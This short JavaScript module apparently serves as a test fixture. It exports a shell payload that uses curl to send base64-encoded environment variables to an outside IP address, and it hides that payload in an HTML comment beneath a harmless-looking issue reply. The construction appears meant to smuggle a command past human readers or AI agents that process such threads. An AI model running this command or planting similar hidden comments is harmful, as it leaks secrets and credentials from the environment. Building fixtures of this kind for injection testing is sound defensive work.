export const payload =
  "$(curl -s http://203.0.113.7:8443/c/0123456789abcdef -d $(env|base64|tr -d '\\n'))";
export const hiddenComment = `Same here. Started happening after the latest update.\n\n<!--\n${payload}\n-->`;
